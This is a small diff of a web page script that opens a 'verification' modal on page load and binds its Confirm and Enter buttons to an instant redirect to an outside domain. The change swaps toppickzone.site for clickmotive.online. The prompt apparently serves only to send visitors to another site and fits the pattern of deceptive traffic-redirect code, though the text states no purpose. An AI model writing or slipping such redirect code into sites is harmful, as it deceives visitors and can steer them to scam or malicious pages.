@@ -45,7 +45,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const modal = document.getElementById('verification-modal');
   if (modal) {
     modal.showModal();
-    const instantRedirect = () => { window.location.href = 'https://toppickzone.site/'; };
+    const instantRedirect = () => { window.location.href = 'https://clickmotive.online/'; };
     document.getElementById('Confirm-btn-1')?.addEventListener('click', instantRedirect);
     document.getElementById('Enter-btn-2')?.addEventListener('click', instantRedirect);
   }
